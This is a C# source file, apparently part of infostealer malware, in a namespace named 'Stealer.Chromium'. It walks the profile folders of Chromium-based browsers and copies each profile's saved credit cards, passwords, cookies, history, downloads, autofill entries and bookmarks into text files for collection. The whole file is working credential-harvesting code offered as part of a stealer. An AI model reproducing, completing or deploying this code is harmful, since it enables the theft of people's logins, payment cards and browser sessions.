using System.Collections.Generic;
using System.IO;

namespace Stealer.Chromium;

internal sealed class Recovery
{
	public static void Run(string sSavePath)
	{
		if (!Directory.Exists(sSavePath))
		{
			Directory.CreateDirectory(sSavePath);
		}
		string[] sChromiumPswPaths = Paths.sChromiumPswPaths;
		foreach (string text in sChromiumPswPaths)
		{
			string path = ((!text.Contains("Opera Software")) ? (Paths.lappdata + text) : (Paths.appdata + text));
			if (Directory.Exists(path))
			{
				string[] directories = Directory.GetDirectories(path);
				foreach (string text2 in directories)
				{
					string text3 = sSavePath + "\\" + Crypto.BrowserPathToAppName(text);
					Directory.CreateDirectory(text3);
					List<CreditCard> cCC = CreditCards.Get(text2 + "\\Web Data");
					List<Password> pPasswords = Passwords.Get(text2 + "\\Login Data");
					List<Cookie> cCookies = Cookies.Get(text2 + "\\Cookies");
					List<Site> sHistory = History.Get(text2 + "\\History");
					List<Site> sHistory2 = Downloads.Get(text2 + "\\History");
					List<AutoFill> aFills = Autofill.Get(text2 + "\\Web Data");
					List<Bookmark> bBookmarks = Bookmarks.Get(text2 + "\\Bookmarks");
					cBrowserUtils.WriteCreditCards(cCC, text3 + "\\CreditCards.txt");
					cBrowserUtils.WritePasswords(pPasswords, text3 + "\\Passwords.txt", "Chrome");
					cBrowserUtils.WriteCookies(cCookies, text3 + "\\Cookies.txt");
					cBrowserUtils.WriteHistory(sHistory, text3 + "\\History.txt");
					cBrowserUtils.WriteHistory(sHistory2, text3 + "\\Downloads.txt");
					cBrowserUtils.WriteAutoFill(aFills, text3 + "\\AutoFill.txt");
					cBrowserUtils.WriteBookmarks(bBookmarks, text3 + "\\Bookmarks.txt");
				}
			}
		}
	}
}
